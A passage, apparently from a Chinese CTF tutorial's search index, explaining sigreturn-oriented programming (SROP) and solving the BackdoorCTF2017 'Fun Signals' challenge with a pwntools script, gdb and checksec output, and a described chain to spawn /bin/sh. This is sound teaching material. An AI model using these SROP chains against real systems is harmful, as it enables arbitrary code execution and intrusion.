\u7684\u7cfb\u7edf\u8c03\u7528\u53f7\n\n\nRDI\n\uff1a\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u5373\u4ece\u54ea\u513f\u8bfb\u5165\n\n\nRSI\n\uff1a\u53ef\u5199\u5185\u5b58\u7684\u5730\u5740\uff0c\u5373\u5199\u5165\u5230\u54ea\u513f\n\n\nRDX\n\uff1a\u8bfb\u5165\u7684\u5b57\u8282\u6570\uff0c\u8fd9\u91cc\u662f 306\n\n\nsigreturn\n gadget \u6267\u884c\u5b8c\u4e4b\u540e\uff0c\u56e0\u4e3a\u8bbe\u7f6e\u4e86 \nRIP\n\uff0c\u4f1a\u518d\u6b21\u6267\u884c \nsyscall; ret;\n gadget\u3002payload \u7684\u7b2c\u4e8c\u90e8\u5206\u5c31\u662f\u901a\u8fc7\u8fd9\u91cc\u8bfb\u5165\u5230\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684\u3002\u8fd9\u4e00\u90e8\u5206\u5305\u542b\u4e86 3 \u4e2a \nsyscall; ret;\n\uff0cfake frame \u548c\u5176\u4ed6\u7684\u4ee3\u7801\u6216\u6570\u636e\u3002\n\n\n\u63a5\u6536\u5b8c\u6570\u636e\u6216\uff0c\nread\n \u51fd\u6570\u8fd4\u56de\uff0c\u8fd4\u56de\u503c\u5373\u8bfb\u5165\u7684\u5b57\u8282\u6570\u88ab\u653e\u5230 \nRAX\n \u4e2d\u3002\u6211\u4eec\u7684\u53ef\u5199\u5185\u5b58\u88ab\u8fd9\u4e9b\u6570\u636e\u6240\u8986\u76d6\uff0c\u5e76\u4e14 \nRSP\n \u6307\u5411\u4e86\u5b83\u7684\u5f00\u5934\u3002\u7136\u540e \nsyscall; ret;\n \u88ab\u6267\u884c\uff0c\u7531\u4e8e \nRAX\n \u7684\u503c\u4e3a 306\uff0c\u5373 \nsyncfs\n \u7684\u7cfb\u7edf\u8c03\u7528\u53f7\uff0c\u8be5\u8c03\u7528\u603b\u662f\u8fd4\u56de 0\uff0c\u800c 0 \u53c8\u662f \nread\n \u7684\u8c03\u7528\u53f7\u3002\n\n\n\u518d\u6b21\u6267\u884c \nsyscall; ret;\n\uff0c\u5373 \nread\n \u7cfb\u7edf\u8c03\u7528\u3002\u8fd9\u4e00\u6b21\uff0c\u8bfb\u5165\u7684\u5185\u5bb9\u4e0d\u91cd\u8981\uff0c\u91cd\u8981\u7684\u662f\u6570\u91cf\uff0c\u8ba9\u5b83\u7b49\u4e8e 15\uff0c\u5373 \nsigreturn\n \u7684\u8c03\u7528\u53f7\u3002\n\n\n\u6267\u884c\u7b2c\u4e09\u4e2a \nsyscall; ret;\n\uff0c\u5373 \nsigreturn\n \u7cfb\u7edf\u8c03\u7528\u3002\u4ece\u7b2c\u4e8c\u4e2a fake frame \u4e2d\u6062\u590d\u5bc4\u5b58\u5668\uff0c\u8fd9\u91cc\u662f \nexecve(\n/bin/sh\n, ...)\n\u3002\u53e6\u5916\u4f60\u8fd8\u53ef\u4ee5\u8c03\u7528 \nmprotect\n \u5c06\u67d0\u6bb5\u6570\u636e\u53d8\u4e3a\u53ef\u6267\u884c\u7684\u3002\n\n\n\u6267\u884c \nexecve\n\uff0c\u62ff\u5230 shell\u3002\n\n\n\n\npwnlib.rop.srop\n\n\n\u5728 pwntools \u4e2d\u5df2\u7ecf\u96c6\u6210\u4e86 SROP \u7684\u5229\u7528\u5de5\u5177\uff0c\u5373 \npwnlib.rop.srop\n\uff0c\u76f4\u63a5\u4f7f\u7528\u7c7b \nSigreturnFrame\n\uff0c\u6211\u4eec\u6765\u770b\u4e00\u4e0b\u5b83\u7684\u6784\u9020\uff1a\n\n \nfrom\n \npwn\n \nimport\n \n*\n\n\n \ncontext\n.\narch\n\n\ni386\n\n\n \nSigreturnFrame\n(\nkernel\n=\ni386\n)\n\n\n{\nes\n:\n \n0\n,\n \nesp_at_signal\n:\n \n0\n,\n \nfs\n:\n \n0\n,\n \ngs\n:\n \n0\n,\n \nedi\n:\n \n0\n,\n \neax\n:\n \n0\n,\n \nebp\n:\n \n0\n,\n \ncs\n:\n \n115\n,\n \nedx\n:\n \n0\n,\n \nebx\n:\n \n0\n,\n \nds\n:\n \n0\n,\n \ntrapno\n:\n \n0\n,\n \necx\n:\n \n0\n,\n \neip\n:\n \n0\n,\n \nerr\n:\n \n0\n,\n \nesp\n:\n \n0\n,\n \nss\n:\n \n123\n,\n \neflags\n:\n \n0\n,\n \nfpstate\n:\n \n0\n,\n \nesi\n:\n \n0\n}\n\n\n \nSigreturnFrame\n(\nkernel\n=\namd64\n)\n\n\n{\nes\n:\n \n0\n,\n \nesp_at_signal\n:\n \n0\n,\n \nfs\n:\n \n0\n,\n \ngs\n:\n \n0\n,\n \nedi\n:\n \n0\n,\n \neax\n:\n \n0\n,\n \nebp\n:\n \n0\n,\n \ncs\n:\n \n35\n,\n \nedx\n:\n \n0\n,\n \nebx\n:\n \n0\n,\n \nds\n:\n \n0\n,\n \ntrapno\n:\n \n0\n,\n \necx\n:\n \n0\n,\n \neip\n:\n \n0\n,\n \nerr\n:\n \n0\n,\n \nesp\n:\n \n0\n,\n \nss\n:\n \n43\n,\n \neflags\n:\n \n0\n,\n \nfpstate\n:\n \n0\n,\n \nesi\n:\n \n0\n}\n\n\n\n\n \ncontext\n.\narch\n \n=\n \namd64\n\n\n \nSigreturnFrame\n(\nkernel\n=\namd64\n)\n\n\n{\nr14\n:\n \n0\n,\n \nr15\n:\n \n0\n,\n \nr12\n:\n \n0\n,\n \nrsi\n:\n \n0\n,\n \nr10\n:\n \n0\n,\n \nr11\n:\n \n0\n,\n \nfpstate\n:\n \n0\n,\n \nrip\n:\n \n0\n,\n \ncsgsfs\n:\n \n51\n,\n \nuc_stack.ss_flags\n:\n \n0\n,\n \noldmask\n:\n \n0\n,\n \nsigmask\n:\n \n0\n,\n \nrsp\n:\n \n0\n,\n \nrax\n:\n \n0\n,\n \nr13\n:\n \n0\n,\n \ncr2\n:\n \n0\n,\n \nr9\n:\n \n0\n,\n \nrcx\n:\n \n0\n,\n \ntrapno\n:\n \n0\n,\n \nerr\n:\n \n0\n,\n \nrbx\n:\n \n0\n,\n \nuc_stack.ss_sp\n:\n \n0\n,\n \nr8\n:\n \n0\n,\n \nrdx\n:\n \n0\n,\n \nrbp\n:\n \n0\n,\n \nuc_flags\n:\n \n0\n,\n \n__reserved\n:\n \n0\n,\n \nuc\n:\n \n0\n,\n \neflags\n:\n \n0\n,\n \nrdi\n:\n \n0\n,\n \nuc_stack.ss_size\n:\n \n0\n}\n\n\n\n\u603b\u5171\u6709\u4e09\u79cd\uff0c\u7ed3\u6784\u548c\u521d\u59cb\u5316\u7684\u503c\u4f1a \u6709\u6240\u4e0d\u540c\uff1a\n- i386 on i386\uff1a32 \u4f4d\u7cfb\u7edf\u4e0a\u8fd0\u884c 32 \u4f4d\u7a0b\u5e8f\n- i386 on amd64\uff1a64 \u4f4d\u7cfb\u7edf\u4e0a\u8fd0\u884c 32 \u4f4d\u7a0b\u5e8f\n- amd64 on amd64\uff1a64 \u4e3a\u7cfb\u7edf\u4e0a\u8fd0\u884c 64 \u4f4d\u7a0b\u5e8f\n\n\nBackdoorCTF2017 Fun Signals\n\n\n$ file funsignals_player_bin\nfunsignals_player_bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped\n\n\n\u8fd9\u662f\u4e00\u4e2a 64 \u4f4d\u9759\u6001\u94fe\u63a5\u7684 srop\uff0c\u53ef\u4ee5\u8bf4\u662f\u4ec0\u4e48\u90fd\u6ca1\u5f00\u3002\u3002\u3002\n\n$ checksec -f funsignals_player_bin\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY  Fortified Fortifiable  FILE\nNo RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No       0               0       funsignals_player_bin\n\n\n\ngdb-peda$ disassemble _start\nDump of assembler code for function _start:\n   0x0000000010000000 \n+0\n:     xor    eax,eax\n   0x0000000010000002 \n+2\n:     xor    edi,edi\n   0x0000000010000004 \n+4\n:     xor    edx,edx\n   0x0000000010000006 \n+6\n:     mov    dh,0x4\n   0x0000000010000008 \n+8\n:     mov    rsi,rsp\n   0x000000001000000b \n+11\n:    syscall\n   0x000000001000000d \n+13\n:    xor    edi,edi\n   0x000000001000000f \n+15\n:    push   0xf\n   0x0000000010000011 \n+17\n:    pop    rax\n   0x0000000010000012 \n+18\n:    syscall\n   0x0000000010000014 \n+20\n:    int3   \nEnd of assembler dump.\ngdb-peda$ disassemble syscall\nDump of assembler code for function syscall:\n   0x0000000010000015 \n+0\n:     syscall\n   0x0000000010000017 \n+2\n:     xor    rdi,rdi\n   0x000000001000001a \n+5\n:     mov    rax,0x3c\n   0x0000000010000021 \n+12\n:    syscall\nEnd of assembler dump.\ngdb-peda$ x/s flag\n0x10000023 \nflag\n:      \nfake_flag_here_as_original_is_at_server\n\n\n\n\u800c\u4e14 flag \u5c31\u5728\u4e8c\u8fdb\u5236\u6587\u4ef6\u91cc\uff0c\u53ea\u4e0d\u8fc7\u662f\u5728\u670d\u52a1\u5668\u4e0a\u7684\u90a3\u4e2a\u91cc\u9762\uff0c\u8fc7\u7a0b\u662f\u5b8c\u5168\u4e00\u6837\u7684\u3002\n\n\n\u9996\u5148\u53ef\u4ee5\u770b\u5230 \n_start\n \u51fd\u6570\u91cc\u6709\u4e24\u4e2a syscall\u3002\u7b2c\u4e00\u4e2a\u662f \nread(0, $rip, 0x400)\n\uff08\u8c03\u7528\u53f7\n0x0\n\uff09\uff0c\u5b83\u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u53d6 \n0x400\n \u4e2a\u5b57\u8282\u5230 \nrip\n \u6307\u5411\u7684\u5730\u5740\u5904\uff0c\u4e5f\u5c31\u662f\u6808\u4e0a\u3002\u7b2c\u4e8c\u4e2a\u662f \nsigreturn()\n\uff08\u8c03\u7528\u53f7\n0xf\n\uff09\uff0c\u5b83\u5c06\u4ece\u6808\u4e0a\u8bfb\u53d6 sigreturn frame\u3002\u6240\u4ee5\u6211\u4eec\u5c31\u53ef\u4ee5\u4f2a\u9020\u4e00\u4e2a frame\u3002\n\n\n\u90a3\u4e48\u600e\u6837\u8bfb\u53d6 flag \u5462\uff0c\u9700\u8981\u4e00\u4e2a \nwrite(1, \nflag, 50)\n\uff0c\u8c03\u7528\u53f7\u4e3a \n0x1\n\uff0c\u800c\u51fd\u6570 \nsyscall\n \u6b63\u597d\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86 \nsyscall\n \u6307\u4ee4\uff0c\u6784\u9020 payload \u5982\u4e0b\uff1a\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nelf\n \n=\n \nELF\n(\n./funsignals_player_bin\n)\n\n\nio\n \n=\n \nprocess\n(\n./funsignals_player_bin\n)\n\n\n# io = remote(\nhack.bckdr.in\n, 9034)\n\n\n\ncontext\n.\nclear\n()\n\n\ncontext\n.\narch\n \n=\n \namd64\n\n\n\n# Creating a custom frame\n\n\nframe\n \n=\n \nSigreturnFrame\n()\n\n\nframe\n.\nrax\n \n=\n \nconstants\n.\nSYS_write\n\n\nframe\n.\nrdi\n \n=\n \nconstants\n.\nSTDOUT_FILENO\n\n\nframe\n.\nrsi\n \n=\n \nelf\n.\nsymbols\n[\nflag\n]\n\n\nframe\n.\nrdx\n \n=\n \n50\n\n\nframe\n.\nrip\n \n=\n \nelf\n.\nsymbols\n[\nsyscall\n]\n\n\n\nio\n.\nsend\n(\nstr\n(\nframe\n))\n\n\nio\n.\ninteractive\n()\n\n\n\n\n$ python2 exp_funsignals.py\n[*] \n/home/firmy/Desktop/funsignals_player_bin\n\n    Arch:     amd64-64-little\n    RELRO:    No RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x10000000)\n    RWX:      Has RWX segments\n[+] Opening connection to 127.0.0.1 on port 10001: Done\n[*] Switching to interactive mode\nfake_flag_here_as_original_is_at_server\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00[*] Got EOF while reading in interactive\n\n\n\u5982\u679c\u8fde\u63a5\u7684\u662f\u8fdc\u7a0b\u670d\u52a1\u5668\uff0c\nfake_flag_here_as_original_is_at_server\n \u4f1a\u88ab\u66ff\u6362\u6210\u771f\u6b63\u7684 flag\u3002\n\n\n\u8fd9\u4e00\u8282\u6211\u4eec\u8be6\u7ec6\u4ecb\u7ecd\u4e86 SROP \u7684\u539f\u7406\uff0c\u5e76\u5c55\u793a\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff0c\u5728\u540e\u9762\u7684\u7ae0\u8282\u4e2d\uff0c\u4f1a\u5c55\u793a\u5176\u66f4\u590d\u6742\u7684\u8fd0\u7528\uff0c\u5305\u6269\u7ed3\u5408 vDSO \u7684\u7528\u6cd5\u3002\n\n\n\u53c2\u8003\u8d44\u6599\n\n\n\n\nFraming Signals\u2014A Return to Portable Shellcode\n\n\nslides: Framing Signals a return to portable shellcode\n\n\nSigreturn Oriented Programming\n\n\nSigreturn Oriented Programming is a real Threat\n\n\nSigreturn Oriented Programming (SROP) Attack\u653b\u51fb\u539f\u7406", 
            "title": "BackdoorCTF2017 Fun-Signals"
        }, 
        {
            "location": "/pwn/lab/6.1.4_pwn_backdoorctf2017_fun_signals/#srop", 
            "text": "", 
            "title": "SROP \u539f\u7406"
        }, 
        {
            "location": "/pwn/lab/6.1.4_pwn_backdoorctf2017_fun_signals/#linux", 
            "text": "\u5728\u5f00\u59cb\u8fd9\u4e00\u5207\u4e4b\u524d\uff0c\u6211\u60f3\u5148\u8bb2\u4e00\u4e0b Linux \u7684\u7cfb\u7edf\u8c03\u7528\u300264 \u4f4d\u548c 32 \u4f4d\u7684\u7cfb\u7edf\u8c03\u7528\u8868\u5206\u522b\u5728 /usr/include/asm/unistd_64.h  \u548c  /usr/include/asm/unistd_32.h  \u4e2d\uff0c\u53e6\u5916\u8fd8\u9700\u8981\u67e5\u770b  /usr/include/bits/syscall.h \u3002  \u4e00\u5f00\u59cb Linux \u662f\u901a\u8fc7  int 0x80  \u4e2d\u65ad\u7684\u65b9\u5f0f\u8fdb\u5165\u7cfb\u7edf\u8c03\u7528\uff0c\u5b83\u4f1a\u5148\u8fdb\u884c\u8c03\u7528\u8005\u7279\u6743\u7ea7\u522b\u7684\u68c0\u67e5\uff0c\u7136\u540e\u8fdb\u884c\u538b\u6808\u3001\u8df3\u8f6c\u7b49\u64cd\u4f5c\uff0c\u8fd9\u65e0\u7591\u4f1a\u6d6a\u8d39\u8bb8\u591a\u8d44\u6e90\u3002\u4ece Linux 2.6 \u5f00\u59cb\uff0c\u5c31\u51fa\u73b0\u4e86\u65b0\u7684\u7cfb\u7edf\u8c03\u7528\u6307\u4ee4  sysenter / sysexit \uff0c\u524d\u8005\u7528\u4e8e\u4ece Ring3 \u8fdb\u5165 Ring0\uff0c\u540e\u8005\u7528\u4e8e\u4ece Ring0 \u8fd4\u56de Ring3\uff0c\u5b83\u6ca1\u6709\u7279\u6743\u7ea7\u522b\u68c0\u67e5\uff0c\u4e5f\u6ca1\u6709\u538b\u6808\u7684\u64cd\u4f5c\uff0c\u6240\u4ee5\u6267\u884c\u901f\u5ea6\u66f4\u5feb\u3002", 
            "title": "Linux \u7cfb\u7edf\u8c03\u7528"
        }, 
        {
            "location": "/pwn/lab/6.1.4_pwn_backdoorctf2017_fun_signals/#signal", 
            "text": "\u5982\u56fe\u6240\u793a\uff0c\u5f53\u6709\u4e2d\u65ad\u6216\u5f02\u5e38\u4ea7\u751f\u65f6\uff0c\u5185\u6838\u4f1a\u5411\u67d0\u4e2a\u8fdb\u7a0b\u53d1\u9001\u4e00\u4e2a signal\uff0c\u8be5\u8fdb\u7a0b\u88ab\u6302\u8d77\u5e76\u8fdb\u5165\u5185\u6838\uff081\uff09\uff0c\u7136\u540e\u5185\u6838\u4e3a\u8be5\u8fdb\u7a0b\u4fdd\u5b58\u76f8\u5e94\u7684\u4e0a\u4e0b\u6587\uff0c\u7136\u540e\u8df3\u8f6c\u5230\u4e4b\u524d\u6ce8\u518c\u597d\u7684 signal handler \u4e2d\u5904\u7406\u76f8\u5e94\u7684 signal\uff082\uff09\uff0c\u5f53 signal handler \u8fd4\u56de\u540e\uff083\uff09\uff0c\u5185\u6838\u4e3a\u8be5\u8fdb\u7a0b\u6062\u590d\u4e4b\u524d\u4fdd\u5b58\u7684\u4e0a\u4e0b\u6587\uff0c\u6700\u7ec8\u6062\u590d\u8fdb\u7a0b\u7684\u6267\u884c\uff084\uff09\u3002   \u4e00\u4e2a signal frame \u88ab\u6dfb\u52a0\u5230\u6808\uff0c\u8fd9\u4e2a frame \u4e2d\u5305\u542b\u4e86\u5f53\u524d\u5bc4\u5b58\u5668\u7684\u503c\u548c\u4e00\u4e9b signal \u4fe1\u606f\u3002  \u4e00\u4e2a\u65b0\u7684\u8fd4\u56de\u5730\u5740\u88ab\u6dfb\u52a0\u5230\u6808\u9876\uff0c\u8fd9\u4e2a\u8fd4\u56de\u5730\u5740\u6307\u5411  sigreturn  \u7cfb\u7edf\u8c03\u7528\u3002  signal handler \u88ab\u8c03\u7528\uff0csignal handler \u7684\u884c\u4e3a\u53d6\u51b3\u4e8e\u6536\u5230\u4ec0\u4e48 signal\u3002  signal handler \u6267\u884c\u5b8c\u4e4b\u540e\uff0c\u5982\u679c\u7a0b\u5e8f\u6ca1\u6709\u7ec8\u6b62\uff0c\u5219\u8fd4\u56de\u5730\u5740\u7528\u4e8e\u6267\u884c  sigreturn  \u7cfb\u7edf\u8c03\u7528\u3002  sigreturn  \u5229\u7528 signal frame \u6062\u590d\u6240\u6709\u5bc4\u5b58\u5668\u4ee5\u56de\u5230\u4e4b\u524d\u7684\u72b6\u6001\u3002  \u6700\u540e\uff0c\u7a0b\u5e8f\u6267\u884c\u7ee7\u7eed\u3002   \u4e0d\u540c\u7684\u67b6\u6784\u4f1a\u6709\u4e0d\u540c\u7684 signal frame\uff0c\u4e0b\u9762\u662f 32 \u4f4d\u7ed3\u6784\uff0c sigcontext  \u7ed3\u6784\u4f53\u4f1a\u88ab push \u5230\u6808\u4e2d\uff1a struct   sigcontext  { \n   unsigned   short   gs ,   __gsh ; \n   unsigned   short   fs ,   __fsh ; \n   unsigned   short   es ,   __esh ; \n   unsigned   short   ds ,   __dsh ; \n   unsigned   long   edi ; \n   unsigned   long   esi ; \n   unsigned   long   ebp ; \n   unsigned   long   esp ; \n   unsigned   long   ebx ; \n   unsigned   long   edx ; \n   unsigned   long   ecx ; \n   unsigned   long   eax ; \n   unsigned   long   trapno ; \n   unsigned   long   err ; \n   unsigned   long   eip ; \n   unsigned   short   cs ,   __csh ; \n   unsigned   long   eflags ; \n   unsigned   long   esp_at_signal ; \n   unsigned   short   ss ,   __ssh ; \n   struct   _fpstate   *   fpstate ; \n   unsigned   long   oldmask ; \n   unsigned   long   cr2 ;  };  \n\u4e0b\u9762\u662f 64 \u4f4d\uff0cpush \u5230\u6808\u4e2d\u7684\u5176\u5b9e\u662f  ucontext_t  \u7ed3\u6784\u4f53\uff1a // defined in /usr/include/sys/ucontext.h  /* Userlevel context.  */  typedef   struct   ucontext_t \n   { \n     unsigned   long   int   uc_flags ; \n     struct   ucontext_t   * uc_link ; \n     stack_t   uc_stack ;             // the stack used by this context \n     mcontext_t   uc_mcontext ;       // the saved context \n     sigset_t   uc_sigmask ; \n     struct   _libc_fpstate   __fpregs_mem ; \n   }   ucontext_t ;  // defined in /usr/include/bits/types/stack_t.h  /* Structure describing a signal stack.  */  typedef   struct \n   { \n     void   * ss_sp ; \n     size_t   ss_size ; \n     int   ss_flags ; \n   }   stack_t ;  // difined in /usr/include/bits/sigcontext.h  struct   sigcontext  { \n   __uint64_t   r8 ; \n   __uint64_t   r9 ; \n   __uint64_t   r10 ; \n   __uint64_t   r11 ; \n   __uint64_t   r12 ; \n   __uint64_t   r13 ; \n   __uint64_t   r14 ; \n   __uint64_t   r15 ; \n   __uint64_t   rdi ; \n   __uint64_t   rsi ; \n   __uint64_t   rbp ; \n   __uint64_t   rbx ; \n   __uint64_t   rdx ; \n   __uint64_t   rax ; \n   __uint64_t   rcx ; \n   __uint64_t   rsp ; \n   __uint64_t   rip ; \n   __uint64_t   eflags ; \n   unsigned   short   cs ; \n   unsigned   short   gs ; \n   unsigned   short   fs ; \n   unsigned   short   __pad0 ; \n   __uint64_t   err ; \n   __uint64_t   trapno ; \n   __uint64_t   oldmask ; \n   __uint64_t   cr2 ; \n   __extension__   union \n     { \n       struct   _fpstate   *   fpstate ; \n       __uint64_t   __fpstate_word ; \n     }; \n   __uint64_t   __reserved1   [ 8 ];  };  \n\u5c31\u50cf\u4e0b\u9762\u8fd9\u6837\uff1a", 
            "title": "signal \u673a\u5236"
        }, 
        {
            "location": "/pwn/lab/6.1.4_pwn_backdoorctf2017_fun_signals/#srop_1", 
            "text": "SROP\uff0c\u5373 Sigreturn Oriented Programming\uff0c\u6b63\u662f\u5229\u7528\u4e86 Sigreturn \u673a\u5236\u7684\u5f31\u70b9\uff0c\u6765\u8fdb\u884c\u653b\u51fb\u3002  \u9996\u5148\u7cfb\u7edf\u5728\u6267\u884c  sigreturn  \u7cfb\u7edf\u8c03\u7528\u7684\u65f6\u5019\uff0c\u4e0d\u4f1a\u5bf9 signal \u505a\u68c0\u67e5\uff0c\u5b83\u4e0d\u77e5\u9053\u5f53\u524d\u7684\u8fd9\u4e2a frame \u662f\u4e0d\u662f\u4e4b\u524d\u4fdd\u5b58\u7684\u90a3\u4e2a frame\u3002\u7531\u4e8e  sigreturn  \u4f1a\u4ece\u7528\u6237\u6808\u4e0a\u6062\u590d\u6062\u590d\u6240\u6709\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u800c\u7528\u6237\u6808\u662f\u4fdd\u5b58\u5728\u7528\u6237\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\uff0c\u662f\u7528\u6237\u8fdb\u7a0b\u53ef\u8bfb\u5199\u7684\u3002\u5982\u679c\u653b\u51fb\u8005\u53ef\u4ee5\u63a7\u5236\u4e86\u6808\uff0c\u4e5f\u5c31\u63a7\u5236\u4e86\u6240\u6709\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u800c\u8fd9\u4e00\u5207\u53ea\u9700\u8981\u4e00\u4e2a gadget\uff1a syscall; ret; \u3002  \u53e6\u5916\uff0c\u8fd9\u4e2a gadget \u5728\u4e00\u4e9b\u7cfb\u7edf\u4e0a\u6ca1\u6709\u88ab\u5185\u5b58\u968f\u673a\u5316\u5904\u7406\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728\u76f8\u540c\u7684\u4f4d\u7f6e\u4e0a\u627e\u5230\uff0c\u53c2\u7167\u4e0b\u56fe\uff1a   \u901a\u8fc7\u8bbe\u7f6e  eax/rax  \u5bc4\u5b58\u5668\uff0c\u53ef\u4ee5\u5229\u7528  syscall  \u6307\u4ee4\u6267\u884c\u4efb\u610f\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u5c06  sigreturn  \u548c \u5176\u4ed6\u7684\u7cfb\u7edf\u8c03\u7528\u4e32\u8d77\u6765\uff0c\u5f62\u6210\u4e00\u4e2a\u94fe\uff0c\u4ece\u800c\u8fbe\u5230\u4efb\u610f\u4ee3\u7801\u6267\u884c\u7684\u76ee\u7684\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u4f2a\u9020 frame \u7684\u4f8b\u5b50\uff1a   rax=59  \u662f  execve  \u7684\u7cfb\u7edf\u8c03\u7528\u53f7\uff0c\u53c2\u6570  rdi  \u8bbe\u7f6e\u4e3a\u5b57\u7b26\u4e32\u201c/bin/sh\u201d\u7684\u5730\u5740\uff0c rip  \u6307\u5411\u7cfb\u7edf\u8c03\u7528  syscall \uff0c\u6700\u540e\uff0c\u5c06  rt_sigreturn  \u8bbe\u7f6e\u4e3a  sigreturn  \u7cfb\u7edf\u8c03\u7528\u7684\u5730\u5740\u3002\u5f53  sigreturn  \u8fd4\u56de\u540e\uff0c\u5c31\u4f1a\u4ece\u8fd9\u4e2a\u4f2a\u9020\u7684 frame \u4e2d\u6062\u590d\u5bc4\u5b58\u5668\uff0c\u4ece\u800c\u62ff\u5230 shell\u3002  \u4e0b\u9762\u662f\u4e00\u4e2a\u66f4\u590d\u6742\u7684\u4f8b\u5b50\uff1a    \u9996\u5148\u5229\u7528\u4e00\u4e2a\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u5c06\u8fd4\u56de\u5730\u5740\u8986\u76d6\u4e3a\u4e00\u4e2a\u6307\u5411  sigreturn  gadget \u7684\u6307\u9488\u3002\u5982\u679c\u53ea\u6709  syscall \uff0c\u5219\u5c06 RAX \u8bbe\u7f6e\u4e3a 0xf\uff0c\u4e5f\u662f\u4e00\u6837\u7684\u3002\u5728\u6808\u4e0a\u8986\u76d6\u4e0a fake frame\u3002\u5176\u4e2d\uff1a  RSP \uff1a\u4e00\u4e2a\u53ef\u5199\u7684\u5185\u5b58\u5730\u5740  RIP \uff1a syscall; ret;  gadget \u7684\u5730\u5740  RAX \uff1a read  \u7684\u7cfb\u7edf\u8c03\u7528\u53f7  RDI \uff1a\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u5373\u4ece\u54ea\u513f\u8bfb\u5165  RSI \uff1a\u53ef\u5199\u5185\u5b58\u7684\u5730\u5740\uff0c\u5373\u5199\u5165\u5230\u54ea\u513f  RDX \uff1a\u8bfb\u5165\u7684\u5b57\u8282\u6570\uff0c\u8fd9\u91cc\u662f 306  sigreturn  gadget \u6267\u884c\u5b8c\u4e4b\u540e\uff0c\u56e0\u4e3a\u8bbe\u7f6e\u4e86  RIP \uff0c\u4f1a\u518d\u6b21\u6267\u884c  syscall; ret;  gadget\u3002payload \u7684\u7b2c\u4e8c\u90e8\u5206\u5c31\u662f\u901a\u8fc7\u8fd9\u91cc\u8bfb\u5165\u5230\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684\u3002\u8fd9\u4e00\u90e8\u5206\u5305\u542b\u4e86 3 \u4e2a  syscall; ret; \uff0cfake frame \u548c\u5176\u4ed6\u7684\u4ee3\u7801\u6216\u6570\u636e\u3002  \u63a5\u6536\u5b8c\u6570\u636e\u6216\uff0c read  \u51fd\u6570\u8fd4\u56de\uff0c\u8fd4\u56de\u503c\u5373\u8bfb\u5165\u7684\u5b57\u8282\u6570\u88ab\u653e\u5230  RAX  \u4e2d\u3002\u6211\u4eec\u7684\u53ef\u5199\u5185\u5b58\u88ab\u8fd9\u4e9b\u6570\u636e\u6240\u8986\u76d6\uff0c\u5e76\u4e14  RSP  \u6307\u5411\u4e86\u5b83\u7684\u5f00\u5934\u3002\u7136\u540e  syscall; ret;  \u88ab\u6267\u884c\uff0c\u7531\u4e8e  RAX  \u7684\u503c\u4e3a 306\uff0c\u5373  syncfs  \u7684\u7cfb\u7edf\u8c03\u7528\u53f7\uff0c\u8be5\u8c03\u7528\u603b\u662f\u8fd4\u56de 0\uff0c\u800c 0 \u53c8\u662f  read  \u7684\u8c03\u7528\u53f7\u3002  \u518d\u6b21\u6267\u884c  syscall; ret; \uff0c\u5373  read  \u7cfb\u7edf\u8c03\u7528\u3002\u8fd9\u4e00\u6b21\uff0c\u8bfb\u5165\u7684\u5185\u5bb9\u4e0d\u91cd\u8981\uff0c\u91cd\u8981\u7684\u662f\u6570\u91cf\uff0c\u8ba9\u5b83\u7b49\u4e8e 15\uff0c\u5373  sigreturn  \u7684\u8c03\u7528\u53f7\u3002  \u6267\u884c\u7b2c\u4e09\u4e2a  syscall; ret; \uff0c\u5373  sigreturn  \u7cfb\u7edf\u8c03\u7528\u3002\u4ece\u7b2c\u4e8c\u4e2a fake frame \u4e2d\u6062\u590d\u5bc4\u5b58\u5668\uff0c\u8fd9\u91cc\u662f  execve( /bin/sh , ...) \u3002\u53e6\u5916\u4f60\u8fd8\u53ef\u4ee5\u8c03\u7528  mprotect  \u5c06\u67d0\u6bb5\u6570\u636e\u53d8\u4e3a\u53ef\u6267\u884c\u7684\u3002  \u6267\u884c  execve \uff0c\u62ff\u5230 shell\u3002", 
            "title": "SROP"
        }, 
        {
            "location": "/pwn/lab/6.1.4_pwn_backdoorctf2017_fun_signals/#pwnlibropsrop", 
            "text": "\u5728 pwntools \u4e2d\u5df2\u7ecf\u96c6\u6210\u4e86 SROP \u7684\u5229\u7528\u5de5\u5177\uff0c\u5373  pwnlib.rop.srop \uff0c\u76f4\u63a5\u4f7f\u7528\u7c7b  SigreturnFrame \uff0c\u6211\u4eec\u6765\u770b\u4e00\u4e0b\u5b83\u7684\u6784\u9020\uff1a   from   pwn   import   *    context . arch  i386    SigreturnFrame ( kernel = i386 )  { es :   0 ,   esp_at_signal :   0 ,   fs :   0 ,   gs :   0 ,   edi :   0 ,   eax :   0 ,   ebp :   0 ,   cs :   115 ,   edx :   0 ,   ebx :   0 ,   ds :   0 ,   trapno :   0 ,   ecx :   0 ,   eip :   0 ,   err :   0 ,   esp :   0 ,   ss :   123 ,   eflags :   0 ,   fpstate :   0 ,   esi :   0 }    SigreturnFrame ( kernel = amd64 )  { es :   0 ,   esp_at_signal :   0 ,   fs :   0 ,   gs :   0 ,   edi :   0 ,   eax :   0 ,   ebp :   0 ,   cs :   35 ,   edx :   0 ,   ebx :   0 ,   ds :   0 ,   trapno :   0 ,   ecx :   0 ,   eip :   0 ,   err :   0 ,   esp :   0 ,   ss :   43 ,   eflags :   0 ,   fpstate :   0 ,   esi :   0 }     context . arch   =   amd64    SigreturnFrame ( kernel = amd64 )  { r14 :   0 ,   r15 :   0 ,   